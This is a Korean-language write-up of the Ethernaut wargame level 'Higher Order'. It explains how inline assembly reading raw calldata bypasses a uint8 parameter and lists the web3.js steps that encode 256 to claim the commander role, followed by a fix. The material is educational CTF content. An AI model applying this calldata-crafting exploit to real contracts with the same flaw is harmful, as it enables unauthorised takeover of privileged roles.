# Ethernaut Level 30 - Higher Order

## 문제 설명

`treasury` 값을 255보다 크게 만들어 `commander`가 되는 것이 목표이다.

---

## 컨트랙트 분석

```solidity
contract HigherOrder {
    address public commander;
    uint256 public treasury;

    function registerTreasury(uint8) public {
        assembly {
            sstore(1, calldataload(4))  // ← uint8이 아닌 calldata 원본을 저장!
        }
    }

    function claimLeadership() public {
        if (treasury > 255) {
            commander = msg.sender;
        } else {
            revert("Higher Order :: revert");
        }
    }
}
```

---

## 취약점 분석

### ABI 인코딩 vs 인라인 어셈블리 불일치

함수 시그니처는 `uint8` 파라미터를 선언했지만,
내부에서는 `calldataload(4)`로 **raw calldata를 직접 읽는다**.

ABI 인코딩 규칙:
- `uint8` 파라미터도 calldata에서는 **32바이트로 패딩**됨
- 실제 calldata에는 `uint8` 범위(0~255)를 넘는 값도 넣을 수 있음

→ `registerTreasury(uint8)` 시그니처를 유지하면서
  calldata에는 256 이상의 값을 직접 삽입 가능

---

## 공격 단계

### Step 1 — 256을 calldata로 직접 전송

```js
// uint8 타입 대신 uint256으로 직접 인코딩
let sig = web3.eth.abi.encodeFunctionSignature("registerTreasury(uint8)")
let value = web3.eth.abi.encodeParameter("uint256", 256)

await web3.eth.sendTransaction({
    from: player,
    to: contract.address,
    data: sig + value.slice(2)
})
```

### Step 2 — treasury 확인

```js
(await contract.treasury()).toString()
// → "256"
```

### Step 3 — claimLeadership 호출

```js
await contract.claimLeadership()
```

### Step 4 — 확인

```js
await contract.commander()
// → 내 지갑 주소
```

---

## 핵심 교훈

- 함수 파라미터 타입과 어셈블리 수준의 calldata 파싱이 불일치하면 취약
- 인라인 어셈블리로 calldata를 읽을 때 ABI 인코딩 규칙이 우회될 수 있음
- raw calldata 처리 시 입력값 범위 검증을 직접 구현해야 함

```solidity
// ✅ 안전한 구현
function registerTreasury(uint8 _value) public {
    treasury = _value;  // uint8로 자동 범위 제한
}
```
